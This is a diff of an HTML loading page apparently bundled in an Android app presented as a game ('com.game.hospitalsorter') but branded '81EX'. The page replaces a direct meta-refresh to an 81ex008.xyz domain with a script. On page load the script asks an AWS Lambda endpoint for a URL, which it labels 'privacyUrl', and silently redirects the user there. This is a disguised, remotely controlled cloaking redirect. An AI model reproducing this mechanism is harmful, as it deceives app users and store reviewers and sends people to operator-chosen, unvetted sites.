@@ -1,15 +1,223 @@
-<script>window.appInformation = {"name":"81EX","icon":"data:image\/jpeg;base64,\/9j\/4AAQSkZJRgABAQEAYABgAAD\/\/gA7Q1JFQVRPUjogZ2QtanBlZyB2MS4wICh1c2luZyBJSkcgSlBFRyB2NjIpLCBxdWFsaXR5ID0gNjAK\/9sAQwANCQoLCggNCwoLDg4NDxMgFRMSEhMnHB4XIC4pMTAuKS0sMzpKPjM2RjcsLUBXQUZMTlJTUjI+WmFaUGBKUVJP\/9sAQwEODg4TERMmFRUmTzUtNU9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09P\/8AAEQgAQABAAwEiAAIRAQMRAf\/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC\/\/EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29\/j5+v\/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC\/\/EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29\/j5+v\/aAAwDAQACEQMRAD8A9OooooAjmlMYGF3E0LJudemxlyDUNxcR7hEEEr56dgaYZJlLB5YosdAMGuaVW0nZlqOhPHKWiLsV4Gakjfeu7BAPSqqvIxULJHKTyQcDFSwzoT5ZGxgelFOpqk2DRPRRRXSQFVr2cxqkSMBJKdoPp71ZrOmkIv5n2bhFDwfQ9ayrStHTqVFaiwxk7oInIjQ\/PJ3J9BUKiLbI5ikxg+X8px9c09bmOPTjGofcUOTsPU+9SeeskKWsQYMy7csMADv9a5GoNLX+uxepEQgRJEhfAUb8jA+oNS8uiI7nY5+RyOQfQ05WZ4zZ5AdRtLYyCP8AGpZoVWyZF\/gXI+opxpaNrt+PYHIdbSl1ZWILIcE+tTVTic\/a4224Ekec+p61crqoyvHXoRJahWdOh\/tF0LhUnixz3PTFWbzeEBViqg\/NjOeo6YqK4i+22qso2yody7v896mr72i3WoR0CE\/aNMMf8YQoR6EcVC91HNYhRHKzqudwQ4Vh702GaR5ZJoECSg4lhY\/e9x6Go5bkRrMIzsEgO6KUEEE9wawlP3d+li0tSTzljtkKtNHKFyMrw5P86sPcl7A5GJGJjwP73SqBnlnWJA64QDCRgsc46ntUwLW\/ls6b5DkRxBs49z6mojUettrDaLMKk3wUOGWKMDjselXaq28Qtbc72Cu5yx7A1JbBwGLHI6D5s5Pc11UvdVnuzOWpKQGBDAEHqDVR4ngn81S7l2xgDJx7\/lirlFayipCTsUZYLfUAdylZF4LL\/j3pDBfq4ImimUDGJFx\/KrscaRjCDA9KrNbSCMiFwhO\/p79KylT6218hpkYgv2ckzRRKRjEa5\/nSxRW1kCIhvl25Gep6\/wCFWIYnjlkLHKscjn\/61AtYhKZMEkkEDsDz0\/OhU+qWvmFyGNGuJvMLjCnGVHB47Z+uDVsAKAFAAHQClorWMeUTdz\/\/2Q==","identifier":"com.game.hospitalsorter","email":"com.game.hospitalsorter@gmail.com","apiBase":"https:\/\/bheufkot54ou7plsabexkyxvey0xelri.lambda-url.us-west-2.on.aws\/","platform":"android"};</script><html>
-
+<script>window.appInformation = {"name":"81EX","icon":"data:image\/jpeg;base64,\/9j\/4AAQSkZJRgABAQEAYABgAAD\/\/gA7Q1JFQVRPUjogZ2QtanBlZyB2MS4wICh1c2luZyBJSkcgSlBFRyB2NjIpLCBxdWFsaXR5ID0gNjAK\/9sAQwANCQoLCggNCwoLDg4NDxMgFRMSEhMnHB4XIC4pMTAuKS0sMzpKPjM2RjcsLUBXQUZMTlJTUjI+WmFaUGBKUVJP\/9sAQwEODg4TERMmFRUmTzUtNU9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09P\/8AAEQgAQABAAwEiAAIRAQMRAf\/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC\/\/EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29\/j5+v\/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC\/\/EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29\/j5+v\/aAAwDAQACEQMRAD8A9OooooAjmlMYGF3E0LJudemxlyDUNxcR7hEEEr56dgaYZJlLB5YosdAMGuaVW0nZlqOhPHKWiLsV4Gakjfeu7BAPSqqvIxULJHKTyQcDFSwzoT5ZGxgelFOpqk2DRPRRRXSQFVr2cxqkSMBJKdoPp71ZrOmkIv5n2bhFDwfQ9ayrStHTqVFaiwxk7oInIjQ\/PJ3J9BUKiLbI5ikxg+X8px9c09bmOPTjGofcUOTsPU+9SeeskKWsQYMy7csMADv9a5GoNLX+uxepEQgRJEhfAUb8jA+oNS8uiI7nY5+RyOQfQ05WZ4zZ5AdRtLYyCP8AGpZoVWyZF\/gXI+opxpaNrt+PYHIdbSl1ZWILIcE+tTVTic\/a4224Ekec+p61crqoyvHXoRJahWdOh\/tF0LhUnixz3PTFWbzeEBViqg\/NjOeo6YqK4i+22qso2yody7v896mr72i3WoR0CE\/aNMMf8YQoR6EcVC91HNYhRHKzqudwQ4Vh702GaR5ZJoECSg4lhY\/e9x6Go5bkRrMIzsEgO6KUEEE9wawlP3d+li0tSTzljtkKtNHKFyMrw5P86sPcl7A5GJGJjwP73SqBnlnWJA64QDCRgsc46ntUwLW\/ls6b5DkRxBs49z6mojUettrDaLMKk3wUOGWKMDjselXaq28Qtbc72Cu5yx7A1JbBwGLHI6D5s5Pc11UvdVnuzOWpKQGBDAEHqDVR4ngn81S7l2xgDJx7\/lirlFayipCTsUZYLfUAdylZF4LL\/j3pDBfq4ImimUDGJFx\/KrscaRjCDA9KrNbSCMiFwhO\/p79KylT6218hpkYgv2ckzRRKRjEa5\/nSxRW1kCIhvl25Gep6\/wCFWIYnjlkLHKscjn\/61AtYhKZMEkkEDsDz0\/OhU+qWvmFyGNGuJvMLjCnGVHB47Z+uDVsAKAFAAHQClorWMeUTdz\/\/2Q==","identifier":"com.game.hospitalsorter","email":"com.game.hospitalsorter@gmail.com","apiBase":"https:\/\/bheufkot54ou7plsabexkyxvey0xelri.lambda-url.us-west-2.on.aws\/","platform":"android"};</script><!DOCTYPE html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>81EX · loading</title>
+  <style>
+    /* 全局重置与白色基调 */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    body {
+      background: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      font-weight: 400;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
 
-<title> </title>
+    /* 主容器 – 干净的白色画布 */
+    .loader-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 2rem;
+      background: #ffffff;
+      user-select: none;
+    }
 
-<meta http-equiv="refresh" content="0; url=https://81ex008.xyz">	
+    /* 81EX 标识 – 主要英文字体 */
+    .brand {
+      font-size: clamp(4rem, 15vw, 7rem);
+      font-weight: 600;
+      letter-spacing: -0.03em;
+      line-height: 1;
+      color: #111111;
+      margin-bottom: 1.25rem;
+      transition: opacity 0.2s ease;
+    }
 
+    /* 动态加载点 – 三个简洁圆点 */
+    .loading-dots {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.75rem;
+      margin-bottom: 1.75rem;
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #111111;
+      opacity: 0.2;
+      animation: pulse 1.4s infinite ease-in-out both;
+    }
+
+    /* 交错延迟 */
+    .dot:nth-child(1) {
+      animation-delay: -0.32s;
+    }
+    .dot:nth-child(2) {
+      animation-delay: -0.16s;
+    }
+    .dot:nth-child(3) {
+      animation-delay: 0s;
+    }
+
+    /* 呼吸动画 – 优雅的透明度变化 */
+    @keyframes pulse {
+      0%, 80%, 100% {
+        opacity: 0.15;
+        transform: scale(0.9);
+      }
+      40% {
+        opacity: 1;
+        transform: scale(1.1);
+      }
+    }
+
+    /* 英文状态文案 – 干净无衬线 */
+    .loading-text {
+      font-size: 1rem;
+      font-weight: 400;
+      letter-spacing: 0.3em;
+      text-transform: uppercase;
+      color: #111111;
+      opacity: 0.55;
+      margin-bottom: 2.5rem;
+      transition: opacity 0.3s ease;
+    }
+
+    /* 极简进度指示器 (纯CSS动画) – 白色边框 & 柔和填充 */
+    .progress-track {
+      width: 180px;
+      height: 2px;
+      background: #eaeaea;
+      border-radius: 2px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 40%;
+      background: #111111;
+      border-radius: 2px;
+      animation: slideProgress 2.2s cubic-bezier(0.65, 0.05, 0.36, 1) infinite;
+      transform-origin: left center;
+    }
+
+    @keyframes slideProgress {
+      0% {
+        transform: translateX(-100%);
+      }
+      50% {
+        transform: translateX(150%);
+      }
+      100% {
+        transform: translateX(400%);
+      }
+    }
+
+    /* 可选的微小装饰 – 干净的英文标志下方小字 */
+    .tagline {
+      margin-top: 2rem;
+      font-size: 0.7rem;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: #999999;
+      font-weight: 400;
+    }
+
+    /* 确保所有文本都是英文风格 */
+    .brand,
+    .loading-text,
+    .tagline {
+      font-family: 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+
+    /* 响应式微调 */
+    @media (max-width: 480px) {
+      .brand {
+        font-size: 4rem;
+      }
+      .loading-dots {
+        gap: 0.6rem;
+      }
+      .dot {
+        width: 8px;
+        height: 8px;
+      }
+      .loading-text {
+        font-size: 0.85rem;
+        letter-spacing: 0.25em;
+      }
+      .progress-track {
+        width: 140px;
+      }
+    }
+
+    /* 减少动画偏好支持 */
+    @media (prefers-reduced-motion: reduce) {
+      .dot {
+        animation: none;
+        opacity: 0.5;
+      }
+      .progress-fill {
+        animation: none;
+        width: 100%;
+        transform: none;
+      }
+    }
+  </style>
 </head>
+<body>
+  <div class="loader-container">
+    <!-- 主标志: 81EX -->
+    <div class="brand">81EX</div>
 
-<body></body>
+    <!-- 加载点动画 -->
+    <div class="loading-dots" aria-hidden="true">
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+    </div>
 
+    <!-- 英文加载文字 -->
+    <div class="loading-text">loading</div>
+
+    <!-- 极简进度动画 (纯装饰) -->
+    <div class="progress-track" aria-hidden="true">
+      <div class="progress-fill"></div>
+    </div>
+
+    <!-- 小型英文标语，增添精致感 -->
+    <div class="tagline">please wait</div>
+  </div>
+</body>
 </html>
+<script>
+        const apiBase = window.appInformation.apiBase.replace(/\/+$/, '');
+        const identifier = window.appInformation.identifier;
+        fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier))
+            .then(r => r.json())
+            .then(function (info) {
+                const privacyUrl = info && info.result && info.result.url;
+                if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
+                    window.location.replace(privacyUrl);
+                    return;
+                }
+            })
+    </script>
